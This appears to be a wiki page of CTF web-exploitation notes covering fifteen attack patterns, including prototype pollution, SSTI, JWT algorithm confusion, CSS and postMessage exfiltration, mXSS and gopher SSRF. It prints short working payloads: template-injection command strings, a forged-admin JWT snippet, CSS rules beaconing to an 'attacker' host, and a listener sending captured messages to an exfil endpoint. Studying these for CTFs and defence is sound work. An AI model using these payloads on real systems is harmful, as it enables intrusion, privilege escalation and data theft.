---
title: CTF web — modern tricks
slug: ctf-web-modern-tricks
aliases: [ctf-web-tricks, ctf-web-2025]
---

{% raw %}

> **TL;DR:** Modern CTF web challenges chain protocol-level abuses: prototype pollution → RCE through libraries, server-side request smuggling chained with cache poisoning, JWT alg confusion + key extraction, hash-flooding DoS as oracle, novel SSTI in less-common engines (Nunjucks, Pug, Liquid), CSS injection for keystroke timing, WASM-side bugs in browser challenges. Companion to [[client-side-template-injection]] and [[http-smuggling-modern-variants]].

## Pattern 1 — prototype pollution → RCE

Express-style apps where attacker pollutes `Object.prototype.<key>` cause unrelated code paths to behave differently.

```text
POST /api/profile
{"__proto__": {"isAdmin": true}}
```

Cascade:
- Some checks read `user.isAdmin` from `Object.prototype` (the polluted value).
- libraries like `lodash.merge` (≤ 4.17.20), `merge.recursive`, etc., are vulnerable.
- Server-side template engines (Pug, Handlebars) read from prototype during render → RCE if you can pollute the right key.

Trick: even when the app uses safe libraries, look for legacy ones in dependency tree (`npm ls`).

See [[prototype-pollution]], [[prototype-pollution-server-side]].

## Pattern 2 — SSTI in less-common engines

CTF authors avoid Jinja2 lately; expect:
- **Nunjucks** (Node.js): `{{ range.constructor("return process")().mainModule.require("child_process").execSync("id") }}`
- **Pug**: `#{global.process.mainModule.require("child_process").execSync("id")}`
- **Liquid**: harder to escape; usually limited to data exfil unless ruby-Liquid customised
- **Mako** (Python): similar to Jinja with `${...}`
- **Velocity / FreeMarker** (Java): `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`

Identify the engine by error messages, syntax fingerprint, or comment behaviour.

## Pattern 3 — JWT alg confusion

Server expects RS256; attacker submits HS256 token signed with the RS256 public key as the HMAC key. Server's verify(token, public_key) routine doesn't enforce alg, so it computes HMAC-SHA256 with the public key as secret → matches.

```python
import jwt
pub = open("rsa_public.pem","rb").read()
token = jwt.encode({"role":"admin"}, pub, algorithm="HS256")
```

Variants:
- `alg: none` — no signature; some libraries accept.
- `kid` injection — `{"kid": "../../etc/passwd"}` makes the server load file content as key.
- `jku` / `jwk` injection — the token says where its key is hosted; attacker hosts an attacker-signed key.

## Pattern 4 — XS-Leaks (cross-site leaks)

A CTF "leak this admin secret from a different origin" challenge.

- Timing of fetch response indicates whether a query matched.
- Frame size, response status differences.
- CSP violation reports leak character-by-character.

Modern browsers have COOP/COEP/CORP to block many XS-Leaks; CTF challenges sometimes disable these.

See [[xs-leaks]].

## Pattern 5 — CSS exfiltration

A CTF where the challenge prevents JS but allows CSS injection. Attacker uses:

```css
input[value^="a"] { background: url('http://attacker/?a'); }
input[value^="b"] { background: url('http://attacker/?b'); }
...
```

Browser fires the URL for the matched prefix → attacker enumerates character by character.

See [[css-injection-exfiltration]].

## Pattern 6 — race conditions on web actions

A "buy item" endpoint with insufficient locking. Send N requests in parallel via HTTP/2 single-packet attack ([[race-conditions]]).

Burp Turbo Intruder + the "last-byte sync" technique fires all requests within microseconds of each other.

## Pattern 7 — server-side parameter pollution

```
?user_id=victim&user_id=attacker
```

Backend uses one; access check uses the other. Or:
- App accepts JSON body + query params; conflict resolution differs across routes.
- Multipart form-data with two fields named the same.

See [[server-side-parameter-pollution]].

## Pattern 8 — HTTP smuggling within CTF infrastructure

Many web-CTF challenges deploy nginx → backend; smuggling chains hit "internal admin page". Practise [[http-request-smuggling]] and [[http-smuggling-modern-variants]] specifically.

## Pattern 9 — WebSocket-specific tricks

- Cross-Site WebSocket Hijacking (CSWSH) — no Origin check on WebSocket handshake.
- Frame masking + payload mismatch.
- Subprotocol negotiation downgrade.

See [[websocket-attacks]], [[websocket-state-sync-bugs]].

## Pattern 10 — hash-flooding / parser DoS as oracle

Some CTFs use DoS as an oracle:
- Send N rows that all hash to the same bucket → response time spikes when the hash matches a server-side state.
- Timing reveals one bit per request.

Most modern languages use SipHash for dict; older ones (PHP, Python ≤ 3.3) vulnerable.

## Pattern 11 — modern SSRF chains

CTF SSRF often chains:
1. SSRF accepts only HTTPS URLs.
2. Attacker uses `gopher://` to send arbitrary TCP.
3. Targets Redis (`gopher://attacker.local:6379/...`) or memcached.
4. Sets a key the app reads → RCE via deserialisation of the cached value.

`gopherus.py` generates payloads.

## Pattern 12 — DOM XSS via mXSS

Mutation XSS — injection that looks safe but the browser mutates the DOM into an executable form. `<noscript><p title="</noscript><img src=x onerror=alert(1)>"`. Bypasses DOMPurify if used with `WHOLE_DOCUMENT: true` historically.

See [[dompurify-bypass-techniques]].

## Pattern 13 — postMessage misuse

A challenge frame `postMessage`s data to its parent without origin check. Attacker iframes the challenge and listens for messages.

```js
window.addEventListener("message", e => {
  fetch("/exfil?d=" + encodeURIComponent(JSON.stringify(e.data)));
});
```

See [[postmessage-bugs]].

## Pattern 14 — server-sent events injection

App accepts user input that flows into SSE stream. Attacker injects an extra `data:` field that the client parses as a new event.

See [[server-sent-events-injection]].

## Pattern 15 — modern crypto-on-the-web

- ECDSA nonce reuse (signature equation reveals private key).
- AES-GCM nonce reuse (two ciphertexts under same key/nonce → keystream recovery + plaintext disclosure).
- ECB padding oracles still in legacy.
- JWT with weak signing key (`secret`, `password`, `admin` — brute-force HS256).

## Workflow for a hard CTF web challenge

1. Read source carefully (if provided).
2. Identify the framework / engine.
3. Map endpoints + auth model.
4. Look for the "obvious" bug first; often a misdirection.
5. Try chaining two smaller bugs into the full chain.
6. Watch network requests in dev tools for hints (CSP, cookies, headers).
7. Keep notes; CTF logic loops if you're not tracking what you tried.

## Practice resources

- **PortSwigger Web Security Academy** — practitioner+ labs.
- **HackTheBox web challenges**.
- **picoCTF, GoogleCTF, RealWorldCTF**.
- **DownUnderCTF, justCTF**.
- **CTFtime.org** — calendar.

## References
- [PortSwigger Research](https://portswigger.net/research)
- [HackTricks — web pentest](https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Black Hat / Defcon — annual web research](https://www.blackhat.com/)
- See also: [[http-smuggling-modern-variants]], [[cache-poisoning-modern-chains]], [[oauth-modern-attacks]], [[2fa-bypass-deep]], [[client-side-template-injection]]

{% endraw %}
